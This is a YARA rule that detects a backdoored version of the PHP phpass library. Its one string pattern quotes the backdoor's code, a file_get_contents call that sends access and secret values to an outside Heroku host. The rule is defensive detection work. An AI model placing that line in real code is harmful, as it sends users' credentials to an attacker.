rule VULN_PHP_Hack_Backdoored_Phpass_May21_RID3477 : DEMO VULN {
   meta:
      description = "Detects backdoored PHP phpass version"
      author = "Christian Burkard"
      reference = "https://twitter.com/s0md3v/status/1529005758540808192"
      date = "2022-05-24 15:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, VULN"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "file_get_contents(\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\")" ascii
   condition: 
      filesize < 30KB and $x1
}